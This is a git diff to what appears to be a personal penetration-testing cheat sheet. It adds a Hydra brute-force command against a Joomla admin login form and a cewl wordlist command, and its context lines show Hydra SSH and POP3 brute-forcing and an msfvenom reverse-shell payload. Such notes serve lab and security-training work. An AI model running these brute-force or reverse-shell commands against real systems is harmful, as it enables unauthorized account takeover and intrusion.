@@ -283,6 +283,14 @@ hydra -l users.txt \
       ssh://$IP
 ```
 
+## Hydra POST bruteforce 
+```bash
+hydra -V -L user.txt -P password.txt 192.168.203.79 http-post-form \
+  "/joomla/administrator/index.php:\
+username=^USER^&passwd=^PASS^&option=com_login&task=login&return=aW5kZXgiuZXh0OmZhaWx1cmU=:\
+F=Username and password do not match or you do not have an account yet."
+```
+
 ## SMPT (Simple Mail Transfer Protocol) 
 ### Banner & Version*
    ```bash
@@ -307,4 +315,9 @@ msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=$IP LPORT=$port
 # Brute force POP3/IMAP 
 ```bash
 hydra -L valid_users.txt -P passwords.txt pop3://$IP
+```
+
+# cewl (Custom Word List generator) tool spiders a website and builds a wordlist from the text it finds
+```bash 
+cewl $URL -w cewl.list
 ```
